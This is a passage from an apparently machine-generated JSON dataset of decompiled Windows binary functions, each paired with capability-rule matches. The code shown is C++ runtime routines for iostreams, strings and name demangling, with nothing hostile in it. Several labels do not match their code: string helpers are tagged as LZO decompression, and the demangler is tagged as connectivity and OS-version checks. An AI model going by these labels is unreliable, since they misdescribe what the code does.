0x5071d4;\n    *(&stack0xffffffe0 + iVar1) = iVar5;\n    *(&stack0xffffffdc + iVar1) = 0x49f29c;\n    uVar6 = fcn.004a3bc0();\n    *(&stack0xffffffe0 + iVar1) = iVar5;\n    *(&stack0xffffffdc + iVar1) = 0x4a5c80;\n    fcn.004a3910();\n    *(&stack0xffffffe0 + iVar1) = uVar6;\n    *(&stack0xffffffdc + iVar1) = 0x4a5c88;\n    fcn.0041b360();\n    *(&stack0xffffffe0 + iVar1) = iVar5;\n    *(&stack0xffffffdc + iVar1) = 0x4a5c90;\n    fcn.004a3910();\n    *(&stack0xffffffe0 + iVar1) = uVar6;\n    *(&stack0xffffffdc + iVar1) = 0x4a5c98;\n    fcn.0041b360();\n    *(&stack0xffffffe0 + iVar1) = iVar5;\n    *(&stack0xffffffdc + iVar1) = 0x4a5ca0;\n    fcn.004a3910();\n    *(&stack0xffffffe0 + iVar1) = uVar6;\n    *(&stack0xffffffdc + iVar1) = 0x4a5ca8;\n    fcn.0041b360();\n    *(&stack0xffffffe0 + iVar1) = iVar5;\n    *(&stack0xffffffdc + iVar1) = 0x4a5cb0;\n    fcn.004a3910();\n    *(&stack0xffffffe0 + iVar1) = uVar6;\n    *(&stack0xffffffdc + iVar1) = 0x4a5cb8;\n    fcn.0041b360();\n    *(&stack0xffffffe0 + iVar1) = iVar5;\n    *(&stack0xffffffdc + iVar1) = 0x4a5cc0;\n    fcn.004a3910();\n    *(&stack0xffffffe0 + iVar1) = uVar6;\n    *(&stack0xffffffdc + iVar1) = 0x4a5cc8;\n    fcn.0041b360();\n    *(&stack0xffffffdc + iVar1) = 0x4a5ccd;\n    uVar7 = fcn.004a3c30();\n    *(&stack0xffffffe0 + iVar1) = uVar7;\n    if (uVar7 >> 0x20 != 1) {\n        *(&stack0xffffffdc + iVar1) = 0x4a5cda;\n        fcn.0041b360();\n    }\n    *(&stack0xffffffdc + iVar1) = 0x4a5cdf;\n    fcn.004a36d0();\n    *(&stack0xffffffdc + iVar1) = 0x4a5ce4;\n    fcn.004a3840();\n    uVar3 = *(iVar5 + 0x14) | 1;\n    *(iVar5 + 0x14) = uVar3;\n    if ((*(iVar5 + 0x10) & uVar3) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar5 + 0x1c) = 0;\n        }\n        else {\n            *(iVar5 + 0x20) = 0;\n        }\n        return iVar5 + 0x1c;\n    }\n    *(&stack0xffffffe0 + iVar1) = \"ios_base::_M_grow_words allocation failed\";\n    *(&stack0xffffffdc + iVar1) = 0x49a05a;\n    iVar4 = fcn.0049e910(*(&stack0xffffffe0 + iVar1));\n    puVar2 = *(iVar5 + 0x68);\n    uVar6 = extraout_ECX;\n    if ((puVar2 != &stack0xfffffffc) && (puVar2 != NULL)) {\n        *(&stack0xffffffe0 + iVar1) = puVar2;\n        *(&stack0xfffffffc + iVar1) = iVar4;\n        *(&stack0xfffffff8 + iVar1) = extraout_ECX;\n        *(&stack0xffffffdc + iVar1) = 0x499fd5;\n        fcn.004a34b0();\n        iVar4 = *(&stack0xfffffffc + iVar1);\n        uVar6 = *(&stack0xfffffff8 + iVar1);\n    }\n    iVar1 = *(&stack0x00000020 + iVar1);\n    *(iVar5 + 0x68) = iVar4;\n    *(iVar5 + 100) = uVar6;\n    return iVar4 + iVar1 * 8;\n}\n",
        "token_count": 1532
    },
    "004a1320": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * fcn.004a1320(int32_t *param_1, int32_t param_2)\n\n{\n    uint arg_10h;\n    \n    if (param_2 != 0) {\n        arg_10h = sub.msvcrt.dll_strlen(param_2);\n        fcn.0049e080(param_1, param_2, arg_10h);\n        return param_1;\n    }\n    fcn.0049c600(*(param_1 + *(*param_1 + -0xc) + 0x14) | 1);\n    return param_1;\n}\n",
        "token_count": 131
    },
    "004a1600": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t * __cdecl fcn.004a1600(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    ushort uVar2;\n    uint32_t arg_10h;\n    ushort *arg_ch_00;\n    int32_t *piVar3;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t iVar4;\n    ushort *puVar5;\n    ushort uStack76;\n    uint uStack64;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_bp_1ch;\n    uint var_ch;\n    \n    if (arg_ch == 0) {\n        uStack64 = 0x4a16e5;\n        fcn.0049ce20();\n        return arg_8h;\n    }\n    uStack64 = 0x4a161f;\n    arg_10h = sub.msvcrt.dll_strlen();\n    uStack76 = in_stack_ffffffcc;\n    if (arg_10h < 0x3fffffff) {\n        uStack64 = 0x4a163d;\n        arg_ch_00 = fcn.004a34e0();\n        uStack76 = in_stack_ffffffcc;\n        if (arg_10h == 0) {\ncode_r0x004a169c:\n            uStack64 = 0x4a16b2;\n            fcn.0049e420(arg_8h, arg_ch_00, arg_10h);\n            uStack64 = 0x4a16bd;\n            fcn.004a34b0();\n            return arg_8h;\n        }\n        piVar3 = *(arg_8h + *(*arg_8h + -0xc) + 0x7c);\n        if (piVar3 != NULL) {\n            puVar5 = arg_ch_00;\n            do {\n                uStack64 = 0x4a1692;\n                uVar2 = (**(*piVar3 + 0x28))();\n                uStack76 = in_stack_ffffffcc;\n                *puVar5 = uVar2;\n                if (puVar5 == arg_ch_00 + (arg_10h - 1)) goto code_r0x004a169c;\n                puVar5 = puVar5 + 1;\n                piVar3 = *(arg_8h + *(*arg_8h + -0xc) + 0x7c);\n            } while (piVar3 != NULL);\n        }\n        uStack64 = 0x4a16f7;\n        fcn.0049e780();\n        iVar4 = extraout_EDX;\n    }\n    else {\n        uStack64 = 0x4a16fe;\n        fcn.004a3c30();\n        uStack64 = 0x4a170d;\n        fcn.004a34b0();\n        iVar4 = extraout_EDX_00;\n    }\n    if (iVar4 == 1) {\n        uStack64 = 0x4a171e;\n        fcn.004a36d0();\n        arg_8h = arg_8h + *(*arg_8h + -0xc);\n        arg_8h[5] = arg_8h[5] | 1;\n        if ((*(arg_8h + 4) & 1) == 0) {\n            uStack64 = 0x4a175c;\n            fcn.004a3b60();\n            uStack64 = 0x4a1769;\n            fcn.004a3840();\n            uStack64 = 0x4a1771;\n            fcn.0041b360();\n            uStack64 = 0x4a1776;\n            fcn.004a3840();\n            uStack64 = 0x4a177e;\n            fcn.0041b360();\n            piVar3 = fcn.0049e420(in_stack_ffffffc8, &stack0xffffffb4, 1);\n            return piVar3;\n        }\n        uStack64 = 0x4a1732;\n        fcn.004a3b60();\n    }\n    uStack64 = 0x4a1737;\n    fcn.004a36d0();\n    iVar4 = *(*arg_8h + -0xc);\n    puVar1 = arg_8h + iVar4 + 0x14;\n    *puVar1 = *puVar1 | 1;\n    if ((*(arg_8h + iVar4 + 0x10) & 1) != 0) {\n        uStack64 = 0x4a174d;\n        fcn.004a3b60();\n    }\n    uStack64 = 0x4a1752;\n    fcn.004a3840();\n    return arg_8h;\n}\n",
        "token_count": 1105
    },
    "004a1920": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_2\n\nint32_t ** __cdecl\nfcn.004a1920(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t **ppiVar2;\n    uint uVar3;\n    int32_t **var_8h;\n    uint var_ch;\n    uint *var_10h;\n    uint var_1ch;\n    int32_t *piStack56;\n    uint *puStack52;\n    uint var_ch_2;\n    \n    uVar1 = sub.msvcrt.dll_strlen(var_ch);\n    var_8h[1] = NULL;\n    *(var_8h + 2) = 0;\n    *var_8h = var_8h + 2;\n    ppiVar2 = var_10h[1] + uVar1;\n    fcn.004924e0();\n    if (uVar1 <= 0x7fffffffU - var_8h[1]) {\n        fcn.00492660(var_ch, uVar1);\n        fcn.00492660(*var_10h, var_10h[1]);\n        return var_8h;\n    }\n    uVar3 = fcn.0049ec30(0x502f56);\n    if (var_8h + 2 != *var_8h) {\n        fcn.004a34c0(*var_8h);\n    }\n    fcn.0041b360(uVar3);\n    *ppiVar2 = ppiVar2 + 2;\n    fcn.00490cd0(*piStack56, piStack56[1] + *piStack56, 0);\n    fcn.00492660(*puStack52, puStack52[1]);\n    return ppiVar2;\n}\n",
        "token_count": 504
    },
    "004a1a40": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t * __cdecl fcn.004a1a40(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    arg_8h[1] = 0;\n    *arg_8h = arg_8h + 2;\n    *(arg_8h + 2) = 0;\n    fcn.004924e0(arg_10h[1] + 1);\n    fcn.00490f00(arg_8h[1], 0, 1, arg_ch);\n    fcn.00492660(*arg_10h, arg_10h[1]);\n    return arg_8h;\n}\n",
        "token_count": 177
    },
    "004a1ae0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint * __cdecl fcn.004a1ae0(uint *arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_19h;\n    uint var_ch;\n    \n    iVar1 = sub.msvcrt.dll_strlen(arg_ch);\n    uVar2 = fcn.0046ba90(0, 0, &var_19h);\n    *arg_8h = uVar2;\n    fcn.0046d280(*(*arg_10h + -0xc) + iVar1);\n    fcn.0046c3b0(arg_ch, iVar1);\n    fcn.0046c470(arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 182
    },
    "004a1b80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n\nint32_t * __cdecl fcn.004a1b80(int32_t *arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_9h;\n    \n    iVar1 = *arg_ch;\n    if (*(iVar1 + -4) < 0) {\n        iVar1 = fcn.0046c080(&var_9h, 0);\n    }\n    else if (*0x4f59f4 == 0) {\n        *(iVar1 + -4) = *(iVar1 + -4) + 1;\n    }\n    else {\n        LOCK();\n        *(iVar1 + -4) = *(iVar1 + -4) + 1;\n    }\n    *arg_8h = iVar1;\n    fcn.0046c470(arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 210
    },
    "004a1c10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint * __cdecl fcn.004a1c10(uint *arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    uint uVar1;\n    uint var_19h;\n    uint var_ch;\n    \n    uVar1 = fcn.0046ba90(0, 0, &var_19h);\n    *arg_8h = uVar1;\n    fcn.0046d280(*(*arg_10h + -0xc) + 1);\n    fcn.0046c600(1, arg_ch);\n    fcn.0046c470(arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 160
    },
    "004a1ca0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_2\n\nint32_t ** __cdecl\nfcn.004a1ca0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t **ppiVar2;\n    uint uVar3;\n    int32_t **var_8h;\n    uint var_ch;\n    uint *var_10h;\n    uint var_1ch;\n    int32_t *piStack56;\n    uint *puStack52;\n    uint var_ch_2;\n    \n    uVar1 = sub.msvcrt.dll_wcslen(var_ch);\n    var_8h[1] = NULL;\n    *var_8h = var_8h + 2;\n    *(var_8h + 2) = 0;\n    ppiVar2 = var_10h[1] + uVar1;\n    fcn.00495350();\n    if (uVar1 <= 0x3fffffffU - var_8h[1]) {\n        fcn.004954e0(var_ch, uVar1);\n        fcn.004954e0(*var_10h, var_10h[1]);\n        return var_8h;\n    }\n    uVar3 = fcn.0049ec30(0x5032c6);\n    if (var_8h + 2 != *var_8h) {\n        fcn.004a34c0(*var_8h);\n    }\n    fcn.0041b360(uVar3);\n    *ppiVar2 = ppiVar2 + 2;\n    fcn.00493a40(*piStack56, *piStack56 + piStack56[1] * 2, 0);\n    fcn.004954e0(*puStack52, puStack52[1]);\n    return ppiVar2;\n}\n",
        "token_count": 513
    },
    "004a1dc0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t * __cdecl fcn.004a1dc0(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    arg_8h[1] = 0;\n    *arg_8h = arg_8h + 2;\n    *(arg_8h + 2) = 0;\n    fcn.00495350(arg_10h[1] + 1);\n    fcn.00493c70(arg_8h[1], 0, 1, arg_ch);\n    fcn.004954e0(*arg_10h, arg_10h[1]);\n    return arg_8h;\n}\n",
        "token_count": 177
    },
    "004a1e60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint * __cdecl fcn.004a1e60(uint *arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_19h;\n    uint var_ch;\n    \n    iVar1 = sub.msvcrt.dll_wcslen(arg_ch);\n    puVar2 = fcn.00464240(0, 0, &var_19h);\n    *(puVar2 + 3) = 0;\n    puVar2[2] = 0;\n    *puVar2 = 0;\n    *arg_8h = puVar2 + 3;\n    fcn.00465500(*(*arg_10h + -0xc) + iVar1);\n    fcn.00464520(arg_ch, iVar1);\n    fcn.00464600(arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 215
    },
    "004a1f10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n\nint32_t * __cdecl fcn.004a1f10(int32_t *arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_9h;\n    \n    iVar1 = *arg_ch;\n    if (*(iVar1 + -4) < 0) {\n        iVar1 = fcn.004641c0(&var_9h, 0);\n    }\n    else if (*0x4f59f4 == 0) {\n        *(iVar1 + -4) = *(iVar1 + -4) + 1;\n    }\n    else {\n        LOCK();\n        *(iVar1 + -4) = *(iVar1 + -4) + 1;\n    }\n    *arg_8h = iVar1;\n    fcn.00464600(arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 209
    },
    "004a1fa0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint * __cdecl fcn.004a1fa0(uint *arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    uint *puVar1;\n    uint var_19h;\n    uint var_ch;\n    \n    puVar1 = fcn.00464240(0, 0, &var_19h);\n    puVar1[2] = 0;\n    *puVar1 = 0;\n    *(puVar1 + 3) = 0;\n    *arg_8h = puVar1 + 3;\n    fcn.00465500(*(*arg_10h + -0xc) + 1);\n    fcn.004647a0(1, arg_ch);\n    fcn.00464600(arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 194
    },
    "004a2560": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.004a2560(int32_t *arg_8h, int16_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    char cVar4;\n    int16_t iVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint var_34h;\n    int32_t var_30h;\n    int16_t *var_2ch;\n    uint var_1dh;\n    uint var_ch;\n    \n    fcn.0047e5b0(arg_8h, 0);\n    if (var_1dh == '\\0') {\n        iVar9 = *arg_8h;\n        uVar7 = 4;\n    }\n    else {\n        iVar9 = *(arg_8h + *(*arg_8h + -0xc) + 8);\n        iVar8 = 0x7fffffff;\n        if (0 < iVar9) {\n            iVar8 = iVar9;\n        }\n        fcn.0048f500(arg_8h + *(*arg_8h + -0xc) + 0x6c);\n        piVar6 = fcn.004a0ae0(&var_1dh + 1);\n        fcn.0048f620();\n        piVar1 = *(arg_8h + *(*arg_8h + -0xc) + 0x78);\n        piVar2 = piVar1[2];\n        if (piVar1[3] < piVar2 || piVar1[3] == piVar2) {\n            iVar5 = (**(*piVar1 + 0x24))();\n        }\n        else {\n            iVar5 = *piVar2;\n        }\n        var_30h = 0;\n        piVar2 = arg_ch + iVar8 + -1;\n        while (var_2ch = arg_ch,  arg_ch != piVar2) {\n            while( true ) {\n                arg_ch = var_2ch;\n                if (iVar5 == -1) goto code_r0x004a2778;\n                cVar4 = (**(*piVar6 + 8))(0x20, iVar5);\n                if (cVar4 != '\\0') goto code_r0x004a2678;\n                arg_ch = var_2ch + 1;\n                *var_2ch = iVar5;\n                piVar3 = piVar1[2];\n                var_30h = var_30h + 1;\n                if (piVar3 < piVar1[3]) {\n                    iVar5 = *piVar3;\n                    piVar1[2] = piVar3 + 1;\n                }\n                else {\n                    iVar5 = (**(*piVar1 + 0x28))();\n                }\n                if (iVar5 == -1) {\n                    *arg_ch = 0;\n                    iVar9 = *arg_8h;\n                    *(arg_8h + *(iVar9 + -0xc) + 8) = 0;\n                    uVar7 = 2;\n                    goto code_r0x004a26f7;\n                }\n                if (piVar1[3] <= piVar1[2]) break;\n                iVar5 = *piVar1[2];\n                var_2ch = arg_ch;\n                if (arg_ch == piVar2) goto code_r0x004a266e;\n            }\n            iVar5 = (**(*piVar1 + 0x24))();\n        }\ncode_r0x004a266e:\n        var_2ch = piVar2;\n        if (iVar5 == -1) {\ncode_r0x004a2778:\n            *arg_ch = 0;\n            iVar9 = *arg_8h;\n            *(arg_8h + *(iVar9 + -0xc) + 8) = 0;\n            uVar7 = (-(var_30h == 0) & 4) + 2;\n        }\n        else {\ncode_r0x004a2678:\n            *var_2ch = 0;\n            iVar9 = *arg_8h;\n            *(arg_8h + *(iVar9 + -0xc) + 8) = 0;\n            if (var_30h != 0) {\n                return arg_8h;\n            }\n            uVar7 = 4;\n        }\n    }\ncode_r0x004a26f7:\n    fcn.0049ce20(uVar7 | *(arg_8h + *(iVar9 + -0xc) + 0x14));\n    return arg_8h;\n}\n",
        "token_count": 1046
    },
    "00401830": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t * __cdecl fcn.00401830(int32_t *arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_MultiByteToWideChar;\n    iVar1 = arg_ch[1];\n    uVar4 = ~-(arg_10h == '\\0') & 0xfde9;\n    uVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(uVar4, 0, *arg_ch, iVar1 + 1, 0, 0);\n    arg_8h[1] = 0;\n    *arg_8h = arg_8h + 2;\n    *(arg_8h + 2) = 0;\n    fcn.00494910(uVar3);\n    (*pcVar2)(uVar4, 0, *arg_ch, iVar1 + 1, *arg_8h, uVar3);\n    return arg_8h;\n}\n",
        "token_count": 291
    },
    "0040e620": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e620(uint param_1, int32_t param_2)\n\n{\n    char *pcVar1;\n    int32_t in_EAX;\n    \n    if (param_2 == 0) {\n        pcVar1 = *(in_EAX + 0xc);\n        if (*pcVar1 == '\\0') {\n            return 0;\n        }\n        *(in_EAX + 0xc) = pcVar1 + 1;\n        param_2 = *pcVar1;\n    }\n    if (param_2 == 0x68) {\n        fcn.0040e0d0();\n    }\n    else {\n        if (param_2 != 0x76) {\n            return 0;\n        }\n        fcn.0040e0d0();\n        if (**(in_EAX + 0xc) != '_') {\n            return 0;\n        }\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n        fcn.0040e0d0();\n    }\n    if (**(in_EAX + 0xc) != '_') {\n        return 0;\n    }\n    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n    return 1;\n}\n",
        "token_count": 286
    },
    "0040e690": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0040e690(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    \n    cVar1 = *in_EAX;\n    if ((cVar1 != 'r' && cVar1 != 'V') && (cVar1 != 'K')) {\n        if (cVar1 != 'D') {\n            return false;\n        }\n        return in_EAX[1] + 0x89U < 2 || (in_EAX[1] & 0xdfU) == 0x4f;\n    }\n    return true;\n}\n",
        "token_count": 126
    },
    "0040ea70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint * fcn.0040ea70(void)\n\n{\n    uint8_t **ppuVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint8_t **ppuVar5;\n    uint8_t uVar6;\n    int32_t in_EAX;\n    uint *puVar7;\n    int32_t *piVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    int32_t iVar11;\n    uint8_t *puVar12;\n    char *pcVar13;\n    char *pcVar14;\n    uint8_t *puVar15;\n    uint8_t *puVar16;\n    bool bVar17;\n    uchar uVar18;\n    bool bVar19;\n    bool bVar20;\n    uchar uVar21;\n    \n    pcVar14 = *(in_EAX + 0xc);\n    cVar2 = *pcVar14;\n    if (cVar2 == 'L') {\n        pcVar14 = *(in_EAX + 0xc);\n        if (*pcVar14 != 'L') {\n            return NULL;\n        }\n        pcVar13 = pcVar14 + 1;\n        *(in_EAX + 0xc) = pcVar13;\n        cVar2 = pcVar14[1];\n        if ((cVar2 == '_') || (cVar2 == 'Z')) {\n            if (cVar2 == '_') {\n                pcVar13 = pcVar14 + 2;\n                *(in_EAX + 0xc) = pcVar13;\n                cVar2 = pcVar14[2];\n                if (cVar2 != 'Z') {\n                    puVar7 = NULL;\n                    goto joined_r0x0040ea0d;\n                }\n            }\n            *(in_EAX + 0xc) = pcVar13 + 1;\n            puVar7 = fcn.00410a50();\n            pcVar13 = *(in_EAX + 0xc);\n            cVar2 = *pcVar13;\n            goto joined_r0x0040ea0d;\n        }\n        piVar8 = fcn.0040f7c0();\n        if (piVar8 == NULL) {\n            return 0;\n        }\n        if ((*piVar8 == 0x27) && (*(piVar8[2] + 0x10) != 0)) {\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) - *(piVar8[2] + 4);\n        }\n        pcVar13 = *(in_EAX + 0xc);\n        cVar2 = *pcVar13;\n        pcVar14 = pcVar13;\n        if (cVar2 == 'n') {\n            pcVar14 = pcVar13 + 1;\n            *(in_EAX + 0xc) = pcVar14;\n            cVar2 = pcVar13[1];\n        }\n        pcVar13 = pcVar14;\n        if (cVar2 == 'E') {\n            iVar11 = 0;\n        }\n        else {\n            do {\n                if (cVar2 == '\\0') {\n                    return 0;\n                }\n                pcVar13 = pcVar13 + 1;\n                *(in_EAX + 0xc) = pcVar13;\n                cVar2 = *pcVar13;\n            } while (cVar2 != 'E');\n            iVar11 = pcVar13 - pcVar14;\n        }\n        iVar4 = *(in_EAX + 0x14);\n        if (iVar4 < *(in_EAX + 0x18)) {\n            puVar7 = iVar4 * 0x10 + *(in_EAX + 0x10);\n            puVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar4 + 1;\n            if ((pcVar14 == NULL) || (iVar11 == 0)) goto code_r0x0040ea60;\n            puVar7[1] = 0;\n            *puVar7 = 0;\n            puVar7[2] = pcVar14;\n            puVar7[3] = iVar11;\n        }\n        else {\ncode_r0x0040ea60:\n            puVar7 = NULL;\n        }\n        puVar7 = fcn.0040df00(puVar7);\n        pcVar13 = *(in_EAX + 0xc);\n        cVar2 = *pcVar13;\njoined_r0x0040ea0d:\n        if (cVar2 != 'E') {\n            return NULL;\n        }\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        return puVar7;\n    }\n    if (cVar2 == 'T') {\n        if (**(in_EAX + 0xc) != 'T') {\n            return NULL;\n        }\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n        iVar11 = fcn.0040e1d0();\n        if ((-1 < iVar11) && (iVar4 = *(in_EAX + 0x14),  iVar4 < *(in_EAX + 0x18))) {\n            puVar7 = *(in_EAX + 0x10) + iVar4 * 0x10;\n            puVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar4 + 1;\n            *puVar7 = 5;\n            puVar7[2] = iVar11;\n            return puVar7;\n        }\n        return NULL;\n    }\n    if (cVar2 == 's') {\n        if (pcVar14[1] == 'r') {\n            *(in_EAX + 0xc) = pcVar14 + 2;\n            fcn.0040f7c0();\n            uVar10 = fcn.00410650();\n            if (**(in_EAX + 0xc) == 'I') {\n                *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n                uVar10 = fcn.0040f1a0();\n                uVar10 = fcn.0040df00(uVar10);\n            }\n            puVar7 = fcn.0040df00(uVar10);\n            return puVar7;\n        }\n        if (pcVar14[1] == 'p') {\n            *(in_EAX + 0xc) = pcVar14 + 2;\n            fcn.0040ea70();\n            puVar7 = fcn.0040df00(0);\n            return puVar7;\n        }\n    }\n    else if (cVar2 == 'f') {\n        if (pcVar14[1] == 'p') {\n            *(in_EAX + 0xc) = pcVar14 + 2;\n            if (pcVar14[2] == 'T') {\n                iVar11 = 0;\n                *(in_EAX + 0xc) = pcVar14 + 3;\n            }\n            else {\n                uVar9 = fcn.0040e1d0();\n                iVar11 = uVar9 + 1;\n                if ((uVar9 & 0x7fffffff) == 0x7fffffff) {\n                    return 0;\n                }\n            }\n            iVar4 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar4) {\n                return 0;\n            }\n            puVar7 = iVar4 * 0x10 + *(in_EAX + 0x10);\n            puVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar4 + 1;\n            *puVar7 = 6;\n            puVar7[2] = iVar11;\n            return puVar7;\n        }\n    }\n    else {\n        if (cVar2 - 0x30U < 10) {\ncode_r0x0040eaaa:\n            puVar7 = fcn.00410650();\n            if (puVar7 == NULL) {\n                return 0;\n            }\n            if (**(in_EAX + 0xc) != 'I') {\n                return puVar7;\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n            uVar10 = fcn.0040f1a0();\n            puVar7 = fcn.0040df00(uVar10);\n            return puVar7;\n        }\n        if (cVar2 == 'o') {\n            if (pcVar14[1] == 'n') {\n                *(in_EAX + 0xc) = pcVar14 + 2;\n                goto code_r0x0040eaaa;\n            }\n        }\n        else if (((cVar2 == 'i') || (cVar2 == 't')) && (pcVar14[1] == 'l')) {\n            if (cVar2 == 't') {\n                fcn.0040f7c0();\n                pcVar14 = *(in_EAX + 0xc);\n                if (pcVar14[1] == '\\0') {\n                    return 0;\n                }\n            }\n            *(in_EAX + 0xc) = pcVar14 + 2;\n            uVar10 = fcn.0040f0f0();\n            puVar7 = fcn.0040df00(uVar10);\n            return puVar7;\n        }\n    }\n    piVar8 = fcn.004100c0();\n    if (piVar8 == NULL) {\n        return 0;\n    }\n    iVar11 = *piVar8;\n    if (iVar11 == 0x31) {\n        ppuVar5 = piVar8[2];\n        iVar11 = 3;\n        puVar15 = *ppuVar5;\n        ppuVar1 = in_EAX + 0x2c;\n        bVar17 = CARRY4(*ppuVar1, ppuVar5[2] + -2);\n        *ppuVar1 = *ppuVar1 + ppuVar5[2] + -2;\n        bVar20 = *ppuVar1 == NULL;\n        puVar12 = puVar15;\n        puVar16 = 0x503770;\n        do {\n            if (iVar11 == 0) break;\n            iVar11 = iVar11 + -1;\n            bVar17 = *puVar12 < 